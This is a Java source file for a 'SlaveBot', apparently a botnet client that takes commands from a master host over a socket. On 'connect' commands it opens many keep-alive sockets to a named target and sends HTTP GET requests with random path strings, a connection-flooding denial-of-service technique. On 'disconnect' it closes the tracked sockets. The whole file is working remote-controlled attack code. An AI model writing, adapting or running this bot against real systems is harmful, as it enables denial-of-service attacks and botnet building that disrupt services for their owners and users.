import java.io.*;
import java.net.*;
import java.util.*;
import org.omg.Messaging.SyncScopeHelper;
class SCin
{
    private String host_name;
    private Socket sc;
    private int pnum;
   

    public SCin(String host_name, int pnum, Socket sc)
    {
        this.host_name = host_name;
        this.pnum = pnum;
        this.sc = sc;
    }
    public int getPortNumber()
    {
        return pnum;
    }
    public void setPortNumber(int pnum)
    {
        this.pnum = pnum;
    }		
    public void setSocket(Socket sc)
    {
        this.sc = sc;
    }
    public Socket getSocket()
    {
        return sc;
    }
    public void setHostname(String host_name)
    {
        this.host_name = host_name;
    }
    public String getHostname()
    {
        return host_name;
    }
   
    
}

public class SlaveBot
{
    public static void main(String[] args) throws IOException
    {//set sample ip addr and port num
    	int pnum = 8080;
 
	String addr="127.0.0.1";
//check if arg len=4
        if(args.length == 4)
        {
        	for (int i = 0; i < args.length; i++)
        	{
        		if(args[i].equals("p"))
        		{//get pnum from next
        			pnum = Integer.parseInt(args[i+1]);

        		}
        		else if(args[i].equals("h"))
        		{//get ip from next if h
        			addr=args[i+1];
        		}
        	}
        }
//exit otherwise
        else
		{
			System.exit(-1);
		}

       
        String cmd;
	Socket sc = null;		
	ArrayList<SCin> server_info = new ArrayList<SCin>();		
	try
        {//read with loop
	while (true)
            {
		sc = new Socket(addr, pnum);  
		BufferedReader br= new BufferedReader(new InputStreamReader(sc.getInputStream()));
		String host_ip;
                int sport;
		int number_of_attacks;
		//read from input
                cmd = br.readLine();
		//check for null ip
                if (cmd == null)
                    continue;                
                //split cmd
		String splitcmd[] = cmd.split(" ");

                switch (splitcmd[0])
                {
                case "connect":
                    if (splitcmd[1].equals("localhost") || splitcmd[1].equals("all")|| splitcmd[1].equals("127.0.0.1")) 
					{
						//check and perform same function for different keepalive positions in cmd
						if(splitcmd.length == 6 && splitcmd[5].equals("keepalive"))
						{	number_of_attacks = Integer.parseInt(splitcmd[4]);							host_ip = splitcmd[2];
							sport = Integer.parseInt(splitcmd[3]);
							
							for (int i = 0; i< number_of_attacks; i++)
							{//create new socket
								Socket new_socket = new Socket(host_ip, sport);
								SCin SCin = new SCin(host_ip, sport, new_socket);
								server_info.add(SCin);//add to scin
								new_socket.setKeepAlive(true);
								if(new_socket.getKeepAlive() == true)
								{
									String str = "http://" + host_ip.substring(4);
									int message;
									URL url = new URL(str);
									HttpURLConnection url_Connection = (HttpURLConnection) url.openConnection();
									url_Connection.setRequestMethod("GET");
									url_Connection.connect();
									message = url_Connection.getResponseCode();
								}
							}
						}						
						else if(splitcmd.length==6 && splitcmd[4].equals("keepalive") && splitcmd[5].substring(0, 4).equals("url="))
						{
							host_ip = splitcmd[2];
							sport = Integer.parseInt(splitcmd[3]);
							number_of_attacks = 1;
							for (int i = 0; i< number_of_attacks; i++)
							{
								Socket new_socket = new Socket(host_ip, sport);
								SCin SCin = new SCin(host_ip, sport, new_socket);
								server_info.add(SCin);
								new_socket.setKeepAlive(true);
								if(new_socket.getKeepAlive() == true)
								{
									String random = rgen();
									String str = "http://" + host_ip.substring(4) + splitcmd[5].substring(4) + random;
									int message;
									URL url = new URL(str);
									HttpURLConnection url_Connection = (HttpURLConnection) url.openConnection();
									url_Connection.setRequestMethod("GET");
									url_Connection.connect();
									message = url_Connection.getResponseCode();
									response(url);
								}
							}
						}
						else if(splitcmd.length == 7 && splitcmd[6].substring(0, 4).equals("url=")&& splitcmd[5].equals("keepalive"))
						{
							host_ip = splitcmd[2];
							sport = Integer.parseInt(splitcmd[3]);
							number_of_attacks = Integer.parseInt(splitcmd[4]);
							for (int i = 0; i< number_of_attacks; i++)
							{
								Socket new_socket = new Socket(host_ip, sport);
								SCin SCin = new SCin(host_ip, sport, new_socket);
								server_info.add(SCin);
								new_socket.setKeepAlive(true);
								if(new_socket.getKeepAlive() == true)
								{
									String random = rgen();
									String str = "http://" + host_ip.substring(4) + splitcmd[6].substring(4) + random;
									int message;
									URL url = new URL(str);
									HttpURLConnection url_Connection = (HttpURLConnection) url.openConnection();
									url_Connection.setRequestMethod("GET");
									url_Connection.connect();
									message = url_Connection.getResponseCode();
									response(url);
								}
							}
						}
						else if(splitcmd.length == 6 && splitcmd[5].substring(0, 4).equals("url="))
						{number_of_attacks = Integer.parseInt(splitcmd[4]);
							
							sport = Integer.parseInt(splitcmd[3]);
							host_ip = splitcmd[2];
							for (int i = 0; i< number_of_attacks; i++)
							{
								Socket new_socket = new Socket(host_ip, sport);
								SCin SCin = new SCin(host_ip, sport, new_socket);
								server_info.add(SCin);//add to scin
								String random = rgen();
								String str = "http://" + host_ip.substring(4) + splitcmd[5].substring(4) + random;
								int message;
								URL url = new URL(str);//create new URL
								HttpURLConnection url_Connection = (HttpURLConnection) url.openConnection();
								url_Connection.setRequestMethod("GET");
								url_Connection.connect();
								message = url_Connection.getResponseCode();
								response(url);								
							}
						}						
						else if(splitcmd.length == 5 && splitcmd[4].equals("keepalive"))
						{sport = Integer.parseInt(splitcmd[3]);
							number_of_attacks = 1;
							host_ip = splitcmd[2];
							
							//addto SCin
							for (int i = 0; i< number_of_attacks; i++)
							{
								Socket new_socket = new Socket(host_ip, sport);
								SCin SCin = new SCin(host_ip, sport, new_socket);
								server_info.add(SCin);
								new_socket.setKeepAlive(true);
								if(new_socket.getKeepAlive() == true)
								{
									String str = "http://" + host_ip.substring(4);
									int message;
//create new URL
									URL url = new URL(str);
									HttpURLConnection url_Connection = (HttpURLConnection) url.openConnection();//request get
									url_Connection.setRequestMethod("GET");
									url_Connection.connect();
									message = url_Connection.getResponseCode();
								}
							}
						}		
						
						else if (splitcmd.length == 5 && splitcmd[4].substring(0,1).equals("u")) 
						{//check url substring
							if (splitcmd[4].substring(0, 4).equals("url=")) 
							{sport = Integer.parseInt(splitcmd[3]);
								
								host_ip = splitcmd[2];
								//number of attack say 1 since not specified
								number_of_attacks = 1;
								for (int i = 0; i< number_of_attacks; i++)
								{
									int message;
									Socket new_socket = new Socket(host_ip, sport);
									SCin SCin = new SCin(host_ip, sport, new_socket);
									server_info.add(SCin);
									String random = rgen();
									String str = "http://" + host_ip.substring(4) + splitcmd[4].substring(4) + random;//url
									URL url = new URL(str);
									HttpURLConnection url_Connection = (HttpURLConnection) url.openConnection();//get request
									url_Connection.setRequestMethod("GET");
//connect to url
									url_Connection.connect();
									message = url_Connection.getResponseCode();
									response(url);	
								}
							}//else exit
							else
							{
								System.exit(-1);
							}
						}
						//check for 5
						else if(splitcmd.length==5)
						{sport = Integer.parseInt(splitcmd[3]);
							host_ip = splitcmd[2];
							
							number_of_attacks = Integer.parseInt(splitcmd[4]);
							//add to serverinfo
							for (int i = 0; i< number_of_attacks; i++)
							{
								Socket new_socket = new Socket(host_ip, sport);
								SCin SCin = new SCin(host_ip, sport, new_socket);
								server_info.add(SCin);
							}
						}
						//check for 4
						else if(splitcmd.length == 4)
						{sport = Integer.parseInt(splitcmd[3]);
							host_ip = splitcmd[2];
							
							number_of_attacks = 1;
							//add to serverinfo
							for (int i = 0; i< number_of_attacks; i++)
							{
								Socket new_socket = new Socket(host_ip, sport);
								SCin SCin = new SCin(host_ip, sport, new_socket);
								server_info.add(SCin);
							}
						}
						else 
						{
							System.exit(-1);
						}
					}
					else
					{
						System.exit(-1);
					}					
					continue;
				//case for diconnect	
                case "disconnect":
		if(splitcmd[1].equals("localhost")||splitcmd[1].equals("127.0.0.1")||splitcmd[1].equals("all"))
		{//get addr
                	host_ip = splitcmd[2];
		//creat arraylist
                    ArrayList<SCin> CR = new ArrayList<SCin>();
                    
		if(splitcmd.length == 3)
                    {//add to CR
                        for(SCin SCin : server_info)
                        {
                            if(host_ip == SCin.getHostname())
                            {//get host
                            	SCin.getSocket().close();
				
                                CR.add(SCin);                                
                            }
                        }
			//remove from CR
                        for(SCin SCin : CR)
                        {
                        	server_info.remove(SCin);
                        }
                    }
                    else if(splitcmd.length==4)
                    {
                        sport = Integer.parseInt(splitcmd[3]);
			//add in CR
                        for(SCin SCin : server_info)
                        {
                            if(host_ip == SCin.getHostname() && sport == SCin.getPortNumber())
                            {
                            	SCin.getSocket().close();
                            	CR.add(SCin);                            	
                            }
                        }
			//remove from CR
                        for(SCin SCin : CR)
                        {
                        	server_info.remove(SCin);
                        }
                    }
					else
					{
						System.exit(-1);
					}
					}
					else
					{
						System.exit(-1);
					}
                    continue;

                default:
                    continue;
                }
            }
        }
        catch (IOException e)
        {
            e.printStackTrace();
            sc.close();
        }
    }
	public static String rgen()
	{
		String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
		Random r = new Random();
		int num = r.nextInt(10) + 1;
		String random_str = "";
		//randomize with loop		
		for(int i = 0; i < num; i++)
		{
			char c = str.charAt(r.nextInt(52));
			random_str = random_str + c;
		}
		
		return random_str;
	}
	public static void response(URL url)throws IOException
	{		try{
			Scanner sc = new Scanner(url.openStream());
			while(sc.hasNext())
			{
				sc.nextLine();
			}
			sc.close();
		}catch(IOException e){
			System.exit(-1);
		}
	}
	
}





